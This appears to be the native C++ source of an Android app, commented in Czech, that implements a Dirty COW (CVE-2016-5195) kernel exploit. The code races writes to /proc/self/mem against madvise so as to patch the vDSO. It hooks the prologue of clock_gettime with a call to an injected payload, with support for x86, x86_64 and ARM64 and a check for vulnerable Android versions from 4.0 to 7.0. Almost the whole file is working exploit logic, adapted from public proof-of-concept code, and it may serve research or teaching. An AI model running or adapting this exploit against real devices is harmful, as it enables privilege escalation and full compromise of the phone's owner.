/*
 * Autor: Vit Soucek (soucevi1@fit.cvut.cz)
 * Hlavni zdroje:
    - proof-of-concept utoku na Dirty Cow pomoci vDSO uzivatele GitHubu scumjr (https://github.com/scumjr/dirtycow-vdso)
    - proof-of-concept utoku na Dirty Cow v Androidu uzivatele GitHubu timwr (https://github.com/timwr/CVE-2016-5195)
 *  Kod prevzaty z techto projektu je oznacem pouze jmenem autora.
 *  Pokud je cast kodu prevzata z jineho zdroje, je odkaz primo u daneho mista.
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <jni.h>
#include <string>
#include <fstream>
#include <algorithm>
#include <vector>
#include <cstring>
#include <stdlib.h>
#include <android/log.h>
#include <err.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <sched.h>

#include <cpu-features.h> // nutno pridat do CMakeLists.txt:

#include <poll.h>
#include <stdbool.h>
#include <pthread.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/ptrace.h>
#include <sys/socket.h>

#include <sys/types.h>
#include <dlfcn.h>

#include "payloads.h"
#include "elf-parsing.cpp"

#define APPNAME "DIRTY_COW"
#define LOG(...) { __android_log_print(ANDROID_LOG_ERROR, APPNAME, __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof(arr[0]))

#define LOOP    0x100000
#define TIMEOUT 5000

using namespace std;

unsigned int vDSO_size = PAGE_SIZE;
unsigned int instruction_size = 0;

// Struct reprezentujici "prolog" funkce clock_gettime()
//      Prologem se mysli prvnich nekolik instrukci
struct prologue {
    char *opcodes;
    size_t size;
};

// Databaze prologu clock_gettime pro architektury s promenlivou delkou instrukce
static struct prologue prologues[] = {
        // 64bitove prology z Githubu uzivatele scumjr
        /* push rbp; mov rbp, rsp; lfence */
        {(char *) "\x55\x48\x89\xe5\x0f\xae\xe8", 7},
        /* push rbp; mov rbp, rsp; push r14 */
        {(char *) "\x55\x48\x89\xe5\x41\x57",     6},
        /* push rbp; mov rbp, rdi; push rbx */
        {(char *) "\x55\x48\x89\xfd\x53",         5},
        /* push rbp; mov rbp, rsp; xchg rax, rax */
        {(char *) "\x55\x48\x89\xe5\x66\x66\x90", 7},
        /* push rbp; cmp edi, 1; mov rbp, rsp */
        {(char *) "\x55\x83\xff\x01\x48\x89\xe5", 7},

        // Nove 32bitove prology
        /* push ebp; mov ebp, esp; push edi; push esi; push ebx */
        {(char *) "\x55\x89\xe5\x57\x56\x53",     6},

        // Nove 64bitove prology
        /* push rbp; push r13; push r12; push rbx; sub 0x10, rsp */
        {(char*) "\x55\x41\x55\x41\x54\x53\x48\x83\xec\x10", 10},
        /* push rbp; push r14; push r13; push r12; push rbx; mov edi, ebx */
        {(char*) "\x55\x41\x56\x41\x55\x41\x54\x53\x89\xfb", 10},
        {(char*) "\x55\x41\x56\x41\x55\x41\x54\x53\x48\x89\xfb", 11},
        /* push rbp; mov rbp, rsp; push r13; push r12; push rbx */
        {(char*) "\x55\x48\x89\xe5\x41\x55\x41\x54\x53", 9},
        /*push rbp; push r14; push r13; push r12 */
        {(char*) "\x55\x41\x56\x41\x55\x41\x54", 7},
};

// Vzor, ktery se bude hledat v payloadu pri jeho uprave
#define PATTERN_PROLOGUE_x86  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#define PATTERN_PROLOGUE_AARCH64 "\x1F\x20\x03\xD5\x1F\x20\x03\xD5"

// Struct pro zaplatu vDSO
struct patch {
    unsigned char *patch;
    size_t size;
    void *addr;
};
// Pole structu pro zaplaty
//      - prvni prvek nese zaplatu prologu clock_gettime()
//      - druhy prvek nese samotny payload, ktery prijde na konec vDSO
struct patch vdso_patch[2];

// Struct pro predavani informaci mezi vlakny
struct mem_arg {
    void *vdso_addr;
    bool stop;
    unsigned int patch_number;
};

//==================================================================================================
// Ziskani velikosti VDSO
//      zdroj: Utok na libc uzivatele GitHubu scumjr
//             (https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2),
//             upraveno pro hledani velikosti vDSO (misto adresniho rozsahu libc)
//==================================================================================================
unsigned int get_vDSO_size()
{
    char line[4096];
    char filename[PATH_MAX];
    char flags[32];
    FILE *fp;
    unsigned long start, end;

    LOG("* Reading /proc/self/maps");
    fp = fopen("/proc/self/maps", "r");
    if (fp == NULL) {
        LOG("    Cannot open /proc/self/maps");
        return 0;
    }

    while (fgets(line, sizeof(line), fp) != NULL) {
        sscanf(line, "%lx-%lx %s %*Lx %*x:%*x %*Lu %s", &start, &end, flags, filename);

        if (strstr(flags, "r-xp") == NULL) {
            continue;
        }

        if (strstr(filename, "vdso") == NULL) { // u 64 bit je tu libc64.
            continue;
        }
        vDSO_size = (unsigned int)(end - start); // Velikost je bud 1 stranka, nebo 2 (radove tisice B)
        LOG("start: %lx, end %lx", start, end);
        break;
    }

    LOG("    vDSO size = %u", vDSO_size);
    fclose(fp);
    return vDSO_size;
}


//==================================================================================================
// Ziskani adresy clock_gettime vyparsovanim primo ze symbol table namapovaneho ELF vDSO
//==================================================================================================
unsigned long get_clock_gettime_offset_elf(unsigned long vDSO_address, int architecture) {
    unsigned long offset;

    LOG("* Getting clock_gettime offset");
    offset = get_offset_from_elf((void *) vDSO_address, architecture);

    return offset;
}

//==================================================================================================
// Ziskani adresy vDSO z /proc/self/auxv
//      - getauxval() je az v API 18, aplikace cili na 14
//==================================================================================================
unsigned long get_vDSO_address() {
    LOG("* Finding vDSO address");

    // Otevre soubor s auxiliary vectorem
    ifstream is("/proc/self/auxv", ifstream::in | ifstream::binary);
    if (!is.is_open()) {
        LOG("    Cannot open /proc/self/auxv");
        return 0;
    }

    std::vector<char> result(170);
    is.seekg(0, ios::beg);
    is.read(&result[0], 170);

    // 0x21 (unsigned long) je tag adresy vDSO v auxiliary vectoru
    std::vector<char> n;
    n.push_back(0x21);
    for (int i = 0; i < sizeof(unsigned long) - 1; i++) {
        n.push_back(0x00);
    }

    // Nalezeni tagu v souboru
    std::vector<char>::iterator it = std::search(result.begin(), result.end(), n.begin(), n.end());
    unsigned long vdso_address = 0;
    if (it == result.end()) {
        // Tag nenalezen
        LOG("    Auxiliary value not found");
        for (std::vector<char>::iterator i = result.begin(); i != result.end(); i++) {
            LOG("    %02x", *i & 0xff);
        }
        is.close();
        return 0;
    } else {
        // Tag nalezen - cteni adresy vDSO
        it += sizeof(unsigned long); // Iterator ted ukazuje za tag
        for (int i = 0; i < sizeof(unsigned long); i++) {
            unsigned long itl = (unsigned long) (*it & 0xff);
            vdso_address ^= (itl << 8 * i);
            it++;
        }
        LOG("    vDSO address = %lx", vdso_address);
    }
    is.close();
    return vdso_address;
}

//==================================================================================================
// Ziskani adresy clock_gettime() ve vDSO
//==================================================================================================
unsigned long get_clock_gettime_address(unsigned long vDSO_address, unsigned long clock_gettime_offset) {
    unsigned long entry_point = vDSO_address + (clock_gettime_offset & 0xfff);
    LOG("    clock_gettime address = %lx",entry_point);
    return entry_point;
}

//==================================================================================================
// Zjisteni, ktery z prologu je pouzit v teto konkretni verzi vDSO
//      - pro architektury s promenlivou delkou instrukci
//      - prolog jiz musi byt znam a ulozen nahore v databazi
//      zdroj: scumjr
//==================================================================================================
struct prologue *get_prologue_from_db(unsigned long clock_gettime_address) {
    struct prologue *p;

    for (int i = 0; i < ARRAY_SIZE(prologues); i++) {
        p = &prologues[i];
        if (memcmp((const void *) clock_gettime_address, p->opcodes, p->size) == 0)
            return p;
    }

    return NULL;
}

//==================================================================================================
// Ziskani prologu primo z pameti.
//      - pro architektury s pevnou delkou instrukce
//      - prolog jsou zde vzdy 2 instrukce
//==================================================================================================
struct prologue * get_prologue_from_memory(unsigned long clock_gettime_address){
    struct prologue *p;
    p = (struct prologue*)malloc(sizeof(struct prologue));
    if(p == NULL){
        return NULL;
    }
    p->size = 2*instruction_size;
    p->opcodes = (char*)malloc(p->size);
    if(p->opcodes == NULL){
        return NULL;
    }
    memcpy(p->opcodes, (void*)clock_gettime_address, p->size);
    return p;
}

//==================================================================================================
// Vlozeni prologu vDSO dovnitr do payloadu
//      zdroj: scumjr, upraveno pro podporu vice architektur
//==================================================================================================
int patch_payload(struct prologue *prol, unsigned char *payload, unsigned int payload_length,
                  AndroidCpuFamily cpu_family) {
    void *p;

    switch(cpu_family) {
        case ANDROID_CPU_FAMILY_X86:
        case ANDROID_CPU_FAMILY_X86_64:
            p = memmem(payload, payload_length, PATTERN_PROLOGUE_x86, sizeof(PATTERN_PROLOGUE_x86) - 1);
            if (p == NULL) {
                LOG("    Failed to patch payload (memmem)");
                return -1;
            }

            memcpy(p, prol->opcodes, prol->size);

            p = memmem(payload, payload_length, PATTERN_PROLOGUE_x86, sizeof(PATTERN_PROLOGUE_x86) - 1);
            if (p != NULL) {
                LOG("    Payload pattern was found several times");
                return -1;
            }
            break;
        case ANDROID_CPU_FAMILY_ARM64:
            p = memmem(payload, payload_length, PATTERN_PROLOGUE_AARCH64, sizeof(PATTERN_PROLOGUE_AARCH64) - 1);
            if (p == NULL) {
                LOG("    Failed to patch payload (memmem)");
                return -1;
            }

            memcpy(p, prol->opcodes, prol->size);
/*
            p = memmem(payload, payload_length, PATTERN_PROLOGUE_AARCH64, sizeof(PATTERN_PROLOGUE_AARCH64) - 1);
            if (p != NULL) {
                LOG("    Payload pattern was found several times");
                return -1;
            }*/
            break;

        case ANDROID_CPU_FAMILY_ARM:
        case ANDROID_CPU_FAMILY_MIPS:
        case ANDROID_CPU_FAMILY_MIPS64:
        case ANDROID_CPU_FAMILY_UNKNOWN:
        default:
            return -1;
    }
    return 0;
}

//==================================================================================================
// Zapis obsah vDSO do souboru
//==================================================================================================
void dump_vDSO(unsigned long vDSO_address, string path) {
    int fd;

    if(path == ""){
        LOG("    Filepath is NULL");
        return;
    }

    path += "/vDSO_dump.bin";

    fd = open(path.c_str(), O_CREAT | O_TRUNC | O_WRONLY, 0644);

    if (fd == -1) {
        LOG("    Unable to open file to dump vDSO");
        return;
    }
    write(fd, (void *) vDSO_address, vDSO_size);
    close(fd);
}

//==================================================================================================
// Ziskani offsetu prazdneho prostoru za vDSO kodem
//==================================================================================================
unsigned long get_empty_space_offset(void *vDSO_address) {
    unsigned char *p = (unsigned char *) vDSO_address;
    unsigned int i;
    for (i = vDSO_size - 1; i > 0; i--) {
        if (p[i] != '\x00') {
            LOG("    Payload size can be up to %d\n", vDSO_size - i);
            LOG("    Payload offset = %x", i);
            while(i % 16 != 0){ // Zarovnani na cele 16ky
                i++;
            }
            return i;
        }
    }
    // Pokud cyklus neskoncil predcasne, offset je teoreticky az na konci
    return vDSO_size;
}

//==================================================================================================
// Sestaveni zaplaty vDSO
//      zdroj: scumjr, pro ARM verzi projekt VIKIROOT uzivatele GitHubu hyln9
//             (https://github.com/hyln9/VIKIROOT/blob/master/exploit.c),
//             upraveno pro podporu vice architektur
//==================================================================================================
int build_vDSO_patch(unsigned long vDSO_address, unsigned long gettime_address, prologue *p,
                     unsigned char *payload, unsigned int payload_length,
                     unsigned long clock_gettime_offset, AndroidCpuFamily cpu_family) {

    uint32_t target;

    // Prvni zaplatou je samotny payload
    vdso_patch[0].patch = payload;
    vdso_patch[0].size = payload_length;
    unsigned long payload_address = vDSO_address + vDSO_size - payload_length;
    while(payload_address % 16 != 0){
        payload_address--;
    }
    vdso_patch[0].addr = (unsigned char *) payload_address;
    LOG("    Patch 0")
    LOG("        - address: %lx", payload_address);

    // Druhou zaplatou je volani adresy payloadu v prologu clock_gettime
    LOG("    Patch 1");
    switch(cpu_family) {
        case ANDROID_CPU_FAMILY_X86:
        case ANDROID_CPU_FAMILY_X86_64:
        LOG("        - x86 payload");
            vdso_patch[1].patch = (unsigned char *) malloc(sizeof(PATTERN_PROLOGUE_x86) - 1);
            if (vdso_patch[1].patch == NULL) {
                LOG("        - Malloc failed");
                return -1;
            }
            memset(vdso_patch[1].patch, '\x90', sizeof(PATTERN_PROLOGUE_x86) - 1);
            vdso_patch[1].patch[0] = (unsigned char) '\xe8'; // Instrukce CALL
            target = payload_address - vDSO_address - clock_gettime_offset; // Target je relativni vzdalenost od konce volajici instrukce
            *(uint32_t *) &vdso_patch[1].patch[1] = target - 5; // Doplneni instrukce CALL o relativni vzdalenost
            LOG("        - target = %04x", target);
            break;


        case ANDROID_CPU_FAMILY_ARM64:
        LOG("        - ARM64 payload");
            vdso_patch[1].patch = (unsigned char *) malloc(sizeof(PATTERN_PROLOGUE_AARCH64) - 1);
            if (vdso_patch[1].patch == NULL) {
                LOG("        - Malloc failed");
                return -1;
            }
            // Instrukce MOV x16, x30 -- zaloha navratove adresy clock_gettime, prepsala by se timto CALLem
            vdso_patch[1].patch[0] = '\xF0';
            vdso_patch[1].patch[1] = '\x03';
            vdso_patch[1].patch[2] = '\x1E';
            vdso_patch[1].patch[3] = '\xAA';
            // Relativni vzdalenost skoku
            target = payload_address - vDSO_address - clock_gettime_offset - instruction_size;
            *(uint16_t *) &vdso_patch[1].patch[4] = (uint16_t) (target / instruction_size); // V OPcodu je pocet 4B instrukci
            LOG("        - target = %04x", target);
            // BL <offset> -- ARM verze instrukce CALL, ktera ulozi navratovou adresu do x30 misto na zasobnik
            vdso_patch[1].patch[6] = '\x00';
            vdso_patch[1].patch[7] = '\x94';
            break;

        case ANDROID_CPU_FAMILY_ARM:
        case ANDROID_CPU_FAMILY_MIPS:
        case ANDROID_CPU_FAMILY_MIPS64:
        case ANDROID_CPU_FAMILY_UNKNOWN:
        default:
            return -1;
    }
    vdso_patch[1].size = p->size;
    vdso_patch[1].addr = (void *) gettime_address;
    LOG("        - address: %lx", gettime_address);
    return 0;
}

//==================================================================================================
// Funkce kontrolujici, zda se utok jiz vydaril
//      zdroj: timwr
//==================================================================================================
void* check_thread(void *arg) {
    struct mem_arg * m_arg = (struct mem_arg *)arg;
    struct patch *p;
    int i, ret;

    p = &vdso_patch[m_arg->patch_number];
    ret = 1;
    for (i = 0; i < TIMEOUT; i++) {
        if (memcmp(p->addr, p->patch, p->size) == 0) {
            ret = 0;
            break;
        }
        usleep(100);
    }
    exit(ret);
}

//==================================================================================================
// Funkce zapisujici do /proc/self/mem
//      zdroj: timwr, upraveno
//==================================================================================================
void *writing_thread(void *arg) {
    struct mem_arg *mem_arg;
    struct patch *p;
    int fd, i, c = 0;

    mem_arg = (struct mem_arg *) arg;
    fd = open("/proc/self/mem", O_RDWR);
    if (fd == -1) {
        LOG("        Unable to open /proc/self/mem");
        return NULL;
    }

    p = &vdso_patch[mem_arg->patch_number];

    for (i = 0; i < LOOP && !mem_arg->stop; i++) {
        lseek(fd, (off_t) p->addr, SEEK_SET);
        c += write(fd, p->patch, p->size);
    }

    LOG("        /proc/self/mem bytes written: %d, iterations: %i", c, i);

    close(fd);

    mem_arg->stop = 1;
    return NULL;
}

//==================================================================================================
// Funkce vynucujici zapis daneho mista z pameti na disk
//      zdroj: scumjr
//==================================================================================================
void *madvise_thread(void *arg) {
    struct mem_arg *m_arg;

    m_arg = (struct mem_arg *) arg;
    while (!m_arg->stop) {
        if (madvise(m_arg->vdso_addr, vDSO_size, MADV_DONTNEED) == -1) {
            LOG("        Madvise failed");
            break;
        }
    }

    return NULL;
}

//==================================================================================================
// Funkce kontrolujici uspesnost utoku
//==================================================================================================
bool check(mem_arg *arg) {
    LOG("        Checking if attack was successful");
    struct patch *vp = &vdso_patch[arg->patch_number];
    return memcmp(vp->addr, vp->patch, vp->size) == 0;
}

//==================================================================================================
// Funkce iniciujici utok pres /proc/self/mem
//      zdroj: scumjr, upraveno pro utok pres /proc/self/mem misto ptrace
//==================================================================================================
int patch_vDSO(struct mem_arg *arg) {
    int status, ret;
    pthread_t pth1, pth2;

    LOG("        Forking");
    pid_t pid = fork();

    // Fork selhal
    if (pid == -1) {
        LOG("        Fork failed");

        // Podproces kontroluje uspesnost
    } else if (pid == 0) {
        check_thread(arg);
    }

    arg->stop = false;

    // Dve hlavni vlakna provadejici utok
    LOG("        Creating main attack threads");
    pthread_create(&pth1, NULL, madvise_thread, arg);
    pthread_create(&pth2, NULL, writing_thread, arg);

    // Cekani na kontrolni vlakno
    LOG("        Waiting for check_thread to exit");
    if (waitpid(pid, &status, 0) == -1) {
        LOG("Waitpid failed");
        return -1;
    }

    // Cekani na hlavni vlakna
    LOG("        Waiting for main threads to end");
    arg->stop = true;
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    // Kontrola uspechu
    ret = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
    if (ret == 0) {
        return 0;
    } else {
        return -1;
    }
}

//==================================================================================================
// Funkce iniciujici utok na Dirty CoW
//    zdroj: timwr, upraveno pro vice pokusu na utok, pridana kontrola
//==================================================================================================
int exploit(struct mem_arg *arg) {
    int exit = 3;

    for (unsigned int i = 0; i < ARRAY_SIZE(vdso_patch); i++) {
        exit = 3;
        arg->patch_number = i;
        LOG("    Patch %d:", i);

        // 3 pokusy na kazdy utok
        for(int j = 0; j < 3; j++){
            patch_vDSO(arg);
            if (check(arg)) {
                LOG("        Attack #%d successful", i);
                break;
            }
            LOG("        Repeating attack #%d", i);
            exit --;
        }
        if(exit == 0){
            break;
        }
    }
    return exit;
}

//==================================================================================================
// Konverze Java String -> std::string
//      zdroj: Odpoved uzivatele Sergey K. na StackOverflow
//             (https://stackoverflow.com/a/11559207/6136143)
//==================================================================================================
string ConvertJString(JNIEnv *env, jstring str) {
    if (!str) {
        string Result;
        Result.clear();
        return Result;
    }

    const jsize len = env->GetStringUTFLength(str);
    const char *strChars = env->GetStringUTFChars(str, (jboolean *) 0);

    std::string Result(strChars, len);

    env->ReleaseStringUTFChars(str, strChars);

    return Result;
}

//==================================================================================================
// Ziskani cesty, kam si aplikace muze ukladat soubory
//==================================================================================================
string get_file_path(JNIEnv *env, jstring filePath){
    string path;
    string sd_path = "/sdcard";
    int fd = open((sd_path + "/test_path.txt").c_str(), O_RDWR|O_CREAT);

    if(fd == -1){ // Nejde zapisovat na SD kartu
        path = ConvertJString(env, filePath);
    } else { // Jde zapisovat na SD kartu
        path = sd_path;
    }

    close(fd);
    LOG("    path: %s", path.c_str());
    return path;
}

//==================================================================================================
// Funkce, ktera zvoli aspekty zavisle na architekture -- payload, ofset clock_gettime
//==================================================================================================
int resolve_architecture(unsigned long vDSO_address, unsigned long *clock_gettime_offset,
                         unsigned char **payload, unsigned int *payload_len,
                         AndroidCpuFamily *family){
    *family = android_getCpuFamily();

    switch(*family){

        case ANDROID_CPU_FAMILY_ARM:
        LOG("    CPU: ARM (32 bit) --- NOT IMPLEMENTED");
            return -1;

        case ANDROID_CPU_FAMILY_ARM64:
        LOG("    CPU: AARCH64 -- testing phase");
            *clock_gettime_offset = get_clock_gettime_offset_elf(vDSO_address, e64);
            if(*clock_gettime_offset == 0){
                return -1;
            }
            *payload = payload_aarch64;
            *payload_len = payload_aarch64_len;
            instruction_size = 4;
            return 0;

        case ANDROID_CPU_FAMILY_X86:
        LOG("    CPU: x86");
            *clock_gettime_offset = get_clock_gettime_offset_elf(vDSO_address, e32);
            if(*clock_gettime_offset == 0){
                return -1;
            }
            *payload = payload_x86;
            *payload_len = payload_x86_len;
            return 0;

        case ANDROID_CPU_FAMILY_X86_64:
        LOG("    CPU: x86_64");
            *clock_gettime_offset = get_clock_gettime_offset_elf(vDSO_address, e64);
            if(*clock_gettime_offset == 0) {
                return -1;
            }
            *payload = payload_x86_64;
            *payload_len = payload_x86_64_len;
            return 0;

        case ANDROID_CPU_FAMILY_MIPS:
        LOG("    CPU: MIPS --- NOT IMPLEMENTED");
            return -1;

        case ANDROID_CPU_FAMILY_MIPS64:
        LOG("    CPU: MIPS64 --- NOT IMPLEMENTED");
            return -1;

        case ANDROID_CPU_FAMILY_UNKNOWN:
        default:
        LOG("    Unable to determine CPU architecture");
            return -1;
    }
}

//==================================================================================================
// Funkce, ktera zkontroluje verzi systemu
//==================================================================================================
int check_sdk_version(int sdk_version){
    if(sdk_version < 14){
        // Pro Android 4.0 a starsi nemusi aplikace fungovat
        LOG("    SDK version might not be supported - too old (%d - older than Android 4.0)", sdk_version);
        LOG("    Trying to attack anyway");
        return 0;
    }

    switch(sdk_version) {
        case 14:
        case 15:
        LOG("    SDK: %d, Android 4.0", sdk_version);
            return 0;
        case 16:
        case 17:
        case 18:
        LOG("    SDK: %d, Android 4.1 -- 4.3", sdk_version);
            return 0;
        case 19:
        case 20:
        LOG("    SDK: %d, Android 4.4", sdk_version);
            return 0;
        case 21:
        LOG("    SDK: %d, Android 5.0", sdk_version);
            return 0;
        case 22:
        LOG("    SDK: %d, Android 5.1", sdk_version);
            return 0;
        case 23:
        LOG("   SDK: %d, Android 6.0", sdk_version);
            return 0;
        case 24:
        LOG("    SDK: %d, Android 7.0", sdk_version);
            return 0;
        default:
            // Android 7.1 vysel az po opraveni Dirty Cow
        LOG("    SDK version not supported (%d) - either too new (Android 7.1 and newer are resistant against Dirty CoW) or non-existent",
            sdk_version);
            return -1;
    }
}

//==================================================================================================
// Hlavni funkce
//==================================================================================================
extern "C"
JNIEXPORT jint
JNICALL
Java_com_bp_dirtycow_MainActivity_dirtyCow(JNIEnv *env, jobject callingObject,
                                                       jstring file_path, jint sdk_version) {
    unsigned char * payload = NULL;
    unsigned int payload_length = 0;

    unsigned long empty_space_offset = 0;
    unsigned long clock_gettime_offset = 0;

    AndroidCpuFamily cpu_family;

    LOG("* Getting storage path");
    string path = get_file_path(env, file_path);

    LOG("* Checking system version");
    if(check_sdk_version((int) sdk_version) == -1){
        return -1;
    }

    unsigned long vDSO_address = get_vDSO_address();
    if (vDSO_address == 0) {
        LOG("    Unable to find vDSO address");
        return -1;
    }

    get_vDSO_size();

    LOG("* Assigning architecture specific aspects");
    if(resolve_architecture(vDSO_address, &clock_gettime_offset, &payload, &payload_length,
                            &cpu_family) == -1){
        LOG("    Error while assigning");
        dump_vDSO(vDSO_address, path);
        return -1;
    }

    LOG("* Getting clock_gettime address");
    unsigned long clock_gettime_address = get_clock_gettime_address(vDSO_address, clock_gettime_offset);
    if (clock_gettime_address == 0)
        return -1;

    LOG("* Getting offset of empty space behind vDSO");
    empty_space_offset = get_empty_space_offset((void *) vDSO_address);

    if (vDSO_size - empty_space_offset + 16 < payload_length) {
        LOG("    Not enough space for payload in vDSO");
        dump_vDSO(vDSO_address, path);
        return -1;
    }

    struct prologue *p;
    switch(cpu_family) {
        case ANDROID_CPU_FAMILY_X86:
        case ANDROID_CPU_FAMILY_X86_64:
        LOG("* Getting prologue from DB");
            p = get_prologue_from_db(clock_gettime_address);
            break;
        case ANDROID_CPU_FAMILY_ARM64:
        case ANDROID_CPU_FAMILY_ARM:
        case ANDROID_CPU_FAMILY_MIPS:
        case ANDROID_CPU_FAMILY_MIPS64:
        LOG("* Getting prologue straight from memory");
            p = get_prologue_from_memory(clock_gettime_address);
            break;
        case ANDROID_CPU_FAMILY_UNKNOWN:
        default:
        LOG("* Architecture not supported");
            dump_vDSO(vDSO_address, path);
            return -1;
    }

    if (p == NULL) {
        LOG("    No prologue found");
        dump_vDSO(vDSO_address, path);
        return -1;
    }

    LOG("* Patching payload");
    if (patch_payload(p, payload, payload_length, cpu_family) == -1) {
        LOG("    Payload patching unsuccessfull");
        dump_vDSO(vDSO_address, path);
        return -1;
    } else {
        LOG("    Payload successfully patched");
    }

    LOG("* Building vDSO patch");
    if (build_vDSO_patch(vDSO_address, clock_gettime_address, p, payload, payload_length,
                         clock_gettime_offset, cpu_family) != 0) {
        LOG("    Failed to build vDSO patch");
        dump_vDSO(vDSO_address, path);
        return -1;
    }

    struct mem_arg arg;
    arg.vdso_addr = (void *) vDSO_address;

    LOG("* STARTING THE ATTACK");
    int r = 0;
    r = exploit(&arg);
    LOG("    Return value = %d", r);

    LOG("* Dumping vDSO");
    dump_vDSO(vDSO_address, path);

    if(r == 0){
        return -1;
    }

    return 0;
}
